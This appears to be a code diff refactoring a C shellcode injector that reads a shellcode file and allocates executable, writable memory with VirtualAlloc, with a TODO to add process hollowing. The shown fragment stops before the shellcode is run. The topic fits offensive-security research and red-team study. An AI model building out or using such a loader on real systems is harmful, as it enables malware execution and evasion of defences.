@@ -2,15 +2,10 @@
 #include <stdio.h>
 #include <stdlib.h>
 
+// TODO: implement process hollowing
+
 int main(int argc, char *argv[])
 {
-    FILE *fin;
-    unsigned char *buffer;
-    long fsize;
-    LPVOID base;
-
-    // TODO: implement process hollowing
-
     if (argc != 2)
     {
         printf("[?] Usage: injector.exe <shellcode-path>\n");
@@ -18,7 +13,7 @@ int main(int argc, char *argv[])
     }
 
     printf("[+] Reading shellcode from %s\n", argv[1]);
-    fin = fopen(argv[1], "rb");
+    FILE *fin = fopen(argv[1], "rb");
 
     if (fin == NULL)
     {
@@ -27,14 +22,14 @@ int main(int argc, char *argv[])
     }
 
     fseek(fin, 0, SEEK_END);
-    fsize = ftell(fin);
+    long fsize = ftell(fin);
     rewind(fin);
 
-    buffer = (char *)malloc(fsize);
+    unsigned char *buffer = (char *)malloc(fsize);
     fread(buffer, fsize, 1, fin);
     fclose(fin);
 
-    base = VirtualAlloc(NULL, fsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID base = VirtualAlloc(NULL, fsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     if (base == NULL)
     {
